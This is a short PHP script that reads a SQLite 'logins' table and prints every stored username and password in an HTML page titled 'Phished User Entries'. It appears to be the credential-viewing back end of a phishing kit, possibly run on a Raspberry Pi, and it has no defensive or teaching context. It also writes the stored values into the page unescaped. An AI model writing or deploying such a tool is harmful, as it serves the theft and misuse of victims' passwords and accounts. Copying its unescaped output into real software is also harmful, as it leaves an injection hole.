
<?php

	// turn on error messages for the file
	ini_set('display_errors',1);
	error_reporting(E_ALL);

	// create a db class that uses SQLite3
	class MyDB extends SQLite3
	{
		function __construct()
		{
			$this->open('test.db');
		}
	}

	// instantiate a new DB class
	$db = new MyDB();

	// check if construction worked properly
	if(!$db)
	{
		echo $db->lastErrorMsg();
	}

	// query the database on the pi for all login records in table
	$post = $db->query('SELECT * FROM logins') or die('Query failed');

	// create table in HTML
	echo "<h1> Phished User Entries </h1>";
	echo "<table><tr><td><h4>Username</h4></td>";
	echo "<td><h4>Password</h4></td></tr>";

	// print every record in table
	while($row = $post->fetchArray())
	{
		echo "<tr><td>{$row['username']}\n</td>";
		echo "<td>{$row['password']}\n</td></tr>";
	}
	echo "</table>";

	$db->close();
?>
